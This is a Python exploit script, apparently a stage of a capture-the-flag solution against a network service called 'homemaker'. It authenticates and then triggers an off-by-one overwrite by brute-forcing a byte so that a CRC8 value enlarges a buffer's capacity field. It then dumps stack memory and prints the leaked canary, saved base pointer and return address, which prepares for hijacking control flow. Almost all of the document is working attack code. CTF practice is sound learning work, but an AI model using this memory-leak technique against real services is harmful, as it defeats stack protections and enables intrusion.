import sys, struct
sys.path.insert(0,'.')
sys.stdout.reconfigure(encoding='utf-8',errors='replace')
import socket
from solve_homemaker import frame, recv_frame, crc8, KEY, HOST, PORT

def cap_byte_for(target, base_payload):
    """tìm 1 byte trong payload để crc8(payload) == target"""
    for x in range(256):
        p = bytearray(base_payload); p[-1] = x
        if crc8(bytes(p)) == target: return bytes(p)
    raise SystemExit("no crc solution")

s = socket.create_connection((HOST,PORT), timeout=15)
s.recv(4096)
s.sendall(frame(bytes([1])+struct.pack(">I",KEY)))
b,_,_,_ = recv_frame(s); print("[*] auth:", b)

# off-by-one: len=257 payload (cmd + 256 data) -> mem[256] := crc byte
data = bytes([2]) + b"A"*256
data = cap_byte_for(0xFF, data)          # crc(payload) = 0xFF -> capacity = 0x01FF
s.sendall(frame(data))
b,_,_,_ = recv_frame(s); print("[*] card1:", b)

s.sendall(frame(b"\x03"))
b,crc,tail,_ = recv_frame(s, timeout=6)
print("[*] dump len = %d (crc ok %s)" % (len(b)-1, crc==crc8(b)))
mem = b[1:]
open('analysis/dump.bin','wb').write(mem)
def u64(off): return struct.unpack("<Q", mem[off:off+8])[0]
print("    mem[0x100] capacity = 0x%x" % struct.unpack("<H", mem[0x100:0x102])[0])
print("    canary  @0x108 = 0x%016x" % u64(0x108))
print("    savedrbp@0x110 = 0x%016x" % u64(0x110))
print("    retaddr @0x118 = 0x%016x" % u64(0x118))
for off in range(0, min(len(mem),0x140), 8):
    v=u64(off)
    if v and (v>>40) in (0,0x55,0x56,0x7f) : print("    [%03x] 0x%016x"%(off,v))
s.close()
